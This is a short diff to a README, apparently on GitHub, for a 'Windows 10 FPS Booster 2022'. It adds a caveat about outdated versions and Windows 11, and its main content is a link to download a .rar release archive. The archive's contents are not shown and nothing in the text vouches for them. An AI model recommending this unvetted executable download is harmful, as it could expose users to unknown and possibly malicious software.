@@ -1,4 +1,7 @@
+
 ## <p align="middle"> Windows 10 FPS Booster 2022
+
+#### <p align="middle"> ❌ some are old version You have to find the new version by simply typing the program name to search. Thanks , and it might not work in Windows 11.
 
 ### <p align="middle"> DOWNLOAD : [Click Here](https://github.com/Speedyreal/Windows10BoosterFPS/releases/download/Windows10/Windows10BoosterFPS.rar)
   
